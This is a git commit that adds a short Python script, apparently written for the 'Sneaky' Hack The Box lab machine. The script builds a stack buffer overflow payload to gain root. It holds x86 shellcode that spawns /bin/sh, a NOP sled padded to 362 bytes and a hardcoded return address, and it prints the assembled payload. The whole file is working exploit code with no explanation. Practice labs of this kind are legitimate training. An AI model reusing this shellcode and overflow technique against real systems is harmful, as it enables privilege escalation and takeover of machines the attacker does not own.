9d3e41cfef191e430d418610f5833238e85c3815
bberrynz <37394329+bberrynz@users.noreply.github.com>
2018-07-05 22:34:41 +1200

    BOF
    Sneaky root from htb

---
+++ sneaky.py
@@ -0,0 +1,14 @@
+#!/usr/bin/python
+#@Author BBerryNZ
+
+shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73"
+"\x68\x68\x2f\x62\x69\x6e\x89"
+"\xe3\x89\xc1\x89\xc2\xb0\x0b"
+"\xcd\x80\x31\xc0\x40\xcd\x80")
+
+NOP_SLED = "\x90"*(362 - len(shellcode))
+#0xffffd060
+EIP = "\x60\xd0\xff\xff"
+payload = NOP_SLED + shellcode + EIP
+
+print(payload)
